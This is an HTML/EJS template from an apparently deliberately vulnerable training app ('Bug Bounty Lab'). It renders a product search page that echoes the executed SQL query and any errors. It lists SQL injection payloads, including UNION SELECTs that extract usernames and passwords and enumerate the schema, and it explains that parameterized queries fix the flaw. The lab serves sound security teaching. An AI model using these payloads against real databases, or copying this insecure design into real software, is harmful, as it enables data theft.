<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= title %></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="/css/style.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="/">
                <i class="fas fa-bug"></i> Bug Bounty Lab
            </a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/sql-injection">← Back to SQL Lab</a>
                <a class="nav-link" href="/">Dashboard</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <h1><i class="fas fa-search"></i> Product Search - SQL Injection</h1>
                <p class="lead">Search for products using the vulnerable search functionality.</p>
            </div>
        </div>

        <div class="row">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header bg-primary text-white">
                        <h5 class="card-title mb-0">Search Products</h5>
                    </div>
                    <div class="card-body">
                        <form method="POST" action="/sql-injection/search">
                            <div class="mb-3">
                                <label for="query" class="form-label">Search Query</label>
                                <input type="text" class="form-control" id="query" name="query" 
                                       placeholder="Enter product name or description" 
                                       value="<%= query || '' %>" required>
                            </div>
                            <button type="submit" class="btn btn-primary">
                                <i class="fas fa-search"></i> Search
                            </button>
                        </form>
                    </div>
                </div>

                <% if (sqlQuery) { %>
                <div class="card mt-3">
                    <div class="card-header bg-warning text-dark">
                        <h6 class="card-title mb-0">
                            <i class="fas fa-code"></i> Executed SQL Query
                        </h6>
                    </div>
                    <div class="card-body">
                        <div class="code-block">
                            <%= sqlQuery %>
                        </div>
                    </div>
                </div>
                <% } %>

                <% if (sqlError) { %>
                <div class="alert alert-danger mt-3">
                    <h6><i class="fas fa-exclamation-triangle"></i> SQL Error</h6>
                    <div class="code-block">
                        <%= sqlError %>
                    </div>
                </div>
                <% } %>
            </div>

            <div class="col-md-6">
                <div class="card">
                    <div class="card-header bg-success text-white">
                        <h5 class="card-title mb-0">Search Results</h5>
                    </div>
                    <div class="card-body">
                        <% if (products && products.length > 0) { %>
                            <div class="table-responsive">
                                <table class="table table-striped">
                                    <thead>
                                        <tr>
                                            <th>ID</th>
                                            <th>Name</th>
                                            <th>Price</th>
                                            <th>Category</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <% products.forEach(product => { %>
                                            <tr>
                                                <td><%= product.id %></td>
                                                <td><%= product.name %></td>
                                                <td>$<%= product.price %></td>
                                                <td><%= product.category %></td>
                                            </tr>
                                        <% }); %>
                                    </tbody>
                                </table>
                            </div>
                        <% } else if (query) { %>
                            <p class="text-muted">No products found for "<%= query %>"</p>
                        <% } else { %>
                            <p class="text-muted">Enter a search query to see results</p>
                        <% } %>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="alert alert-info">
                    <h4><i class="fas fa-lightbulb"></i> Try These Payloads</h4>
                    <div class="row">
                        <div class="col-md-6">
                            <h6>Basic Injection:</h6>
                            <div class="payload-example">
                                <code>' OR '1'='1</code>
                            </div>
                            <div class="payload-example">
                                <code>' OR 1=1 --</code>
                            </div>
                            <div class="payload-example">
                                <code>' UNION SELECT 1,2,3,4 --</code>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <h6>Information Gathering:</h6>
                            <div class="payload-example">
                                <code>' UNION SELECT name, sql, 3, 4 FROM sqlite_master --</code>
                            </div>
                            <div class="payload-example">
                                <code>' UNION SELECT username, password, 3, 4 FROM users --</code>
                            </div>
                            <div class="payload-example">
                                <code>' AND (SELECT COUNT(*) FROM users) > 0 --</code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-3">
            <div class="col-12">
                <div class="alert alert-warning">
                    <h4><i class="fas fa-exclamation-triangle"></i> Vulnerability Details</h4>
                    <p><strong>Type:</strong> SQL Injection via String Concatenation</p>
                    <p><strong>Root Cause:</strong> User input is directly concatenated into SQL queries without proper sanitization or parameterized queries.</p>
                    <p><strong>Impact:</strong> Complete database compromise, data extraction, data modification, and potential system takeover.</p>
                    <p><strong>Fix:</strong> Use parameterized queries (prepared statements) instead of string concatenation.</p>
                </div>
            </div>
        </div>
    </div>

    <footer class="bg-dark text-white text-center py-3 mt-5">
        <div class="container">
            <p class="mb-0">&copy; 2024 Bug Bounty Lab. Educational purposes only.</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
